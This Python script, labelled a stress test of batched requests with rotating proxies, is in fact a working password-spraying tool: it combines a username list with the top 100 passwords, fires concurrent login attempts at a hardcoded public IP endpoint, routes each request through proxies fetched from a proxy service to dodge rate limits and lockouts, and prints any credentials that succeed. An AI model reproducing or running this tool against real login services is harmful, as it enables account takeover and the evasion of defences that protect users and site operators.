import asyncio
import aiohttp
import os
import time
import random
import requests
from dotenv import load_dotenv

load_dotenv()

"""
This file is for stress testing batching implementation + with rotating proxy
"""

url = 'http://54.234.124.97:5050/login'
BATCH_SIZE = 100  # Number of requests per batch

# Map proxies to index
proxiesToIndex = {}
# Proxies List
proxies_list = []




# Function to read proxies from a local file
def read_proxies_from_file(file_path):
    proxies = []
    with open(file_path, 'r') as file:
        for line in file:
            ip_port, protocol = line.strip().split()
            if protocol.upper() == "HTTP":
                proxies.append(f"http://{ip_port}")
    return proxies

# Function to fetch authenticated proxies from a web API
def fetch_proxies_from_web(api_url, token, proxy_username, proxy_password):
    session = requests.Session()
    session.headers.update({
        "Authorization": f"Token {token}"
    })
    proxies = []

    try:
        response = session.get(api_url)
        if response.status_code == 200:
            results = response.json().get("results", [])
            for result in results:
                proxy_address = result.get("proxy_address")
                port = result.get("port")
                proxies.append(f"http://{proxy_username}:{proxy_password}@{proxy_address}:{port}")
            print("Fetched proxy list successfully.")
        else:
            print("Failed to fetch proxy list from web.")
    except requests.RequestException as e:
        print(f"Error fetching proxies from web: {e}")

    return proxies

# Create proxy function that decides source based on crawl_from_web parameter
def create_proxy(crawl_from_web=True):
    if crawl_from_web:
        api_url = "https://proxy.webshare.io/api/v2/proxy/list/?mode=direct&page=1&page_size=25"
        token = os.getenv("PROXY_API_KEY")
        proxy_username = os.getenv("PROXY_API_USERNAME")
        proxy_password = os.getenv("PROXY_API_PASSWORD")
        # print(token)
        return fetch_proxies_from_web(api_url, token, proxy_username, proxy_password)
    else:
        base_dir = os.path.dirname(os.path.abspath(__file__))
        proxy_file_path = os.path.join(base_dir, 'data', 'Proxy', 'proxies3.txt')
        return read_proxies_from_file(proxy_file_path)

# Function to get a random proxy
def get_random_proxy():
    return random.choice(proxies_list)

# Function to send a login request with a proxy
async def send_login_request(username, password, proxy):
    connector = aiohttp.TCPConnector()  # Use proxy with ProxyConnector
    async with aiohttp.ClientSession(connector=connector) as session:
        try:
            proxy = get_random_proxy()
            async with session.post(url, json={'username': username, 'password': password}, proxy=proxy) as response:
                status = response.status
                text = await response.text()
                if status == 200:
                    print(f'[+] Success! Response for {username}:{password} - {text} - {status}')
                # else:
                #     print(f'[-] Failed! Response for {username}:{password} - {text} - {status}')
        except Exception as error:
            print(f'Request failed for {username}:{password} - {error}')

# Function to send requests in batches
async def send_requests_in_batches(username_password_pairs):
    batch_times = []  # List to store the time taken for each batch

    for i in range(0, len(username_password_pairs), BATCH_SIZE):
        batch_pairs = username_password_pairs[i:i + BATCH_SIZE]

        # Start timer for this batch
        batch_start_time = time.time()

        # Create batch of login requests
        batch_requests = [
            send_login_request(username, password, get_random_proxy())
            for username, password in batch_pairs
        ]

        # Send batch and wait for completion
        await asyncio.gather(*batch_requests)

        # Calculate time taken for the batch
        batch_time = time.time() - batch_start_time
        batch_times.append(batch_time)

        # Add a delay after each batch
        # await asyncio.sleep(1)

    total_requests = len(username_password_pairs)
    total_time = sum(batch_times)
    requests_per_second = total_requests / total_time if total_time > 0 else 0

    # Final message format
    print(f"\nBatch Size: {BATCH_SIZE}, Time taken: {total_time:.2f} seconds, Requests per second: {requests_per_second:.2f}")

# Function to perform the password spray
async def password_spray(usernames, passwords):
    username_password_pairs = [(username, password) for username in usernames for password in passwords]
    print(len(username_password_pairs))
    await send_requests_in_batches(username_password_pairs)

# Function to read usernames and passwords from files
def read_usernames(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def read_passwords(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Run the password spray
if __name__ == "__main__":
    # Get the directory of the current script
    base_dir = os.path.dirname(os.path.abspath(__file__))

    # Set file paths for usernames and passwords
   

    username_file_path = os.path.join(base_dir, 'data', 'TestInputSmall', 'username.txt')
    password_file_path = os.path.join(base_dir, 'data', 'TestInput', 'top_100_passwords.txt')


    # Read usernames and passwords
    usernames = read_usernames(username_file_path)
    passwords = read_passwords(password_file_path)

    # print(f"Total login attempts to make: {len(usernames) * len(passwords)}")

    # Example usage:
    proxies_list = create_proxy(crawl_from_web=True)  # Set to False to load from file

    # Create a map to delete proxies in constant time
    proxiesToIndex = {proxy: index for index, proxy in enumerate(proxies_list)}

    # Run the password spray
    asyncio.run(password_spray(usernames, passwords))